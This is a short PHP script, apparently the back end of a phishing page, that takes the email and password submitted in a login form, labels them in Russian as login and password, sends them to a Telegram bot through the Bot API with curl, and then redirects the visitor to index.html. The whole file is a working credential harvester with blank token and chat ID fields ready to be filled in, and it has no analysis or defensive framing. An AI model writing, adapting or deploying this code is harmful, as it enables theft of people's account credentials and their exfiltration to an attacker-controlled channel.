<?php

$token = "";
$chat_id = "";
$redirect_page = 'index.html';

$email = $_POST['email']; 
$pass= $_POST['pass'];

$arr = array(
    "[ Новое уведомление ]" => '%0A',
   
    'Логин: ' => $email,
    'Пароль: ' => $pass
);


foreach($arr as $key => $value) {
    $txt .= "<b>".$key."</b> ".$value."%0A";
};


$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&parse_mode=html&text=$txt";

$ch = curl_init();
$optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);


header("Location: $redirect_page", true, 301);
exit();


?>
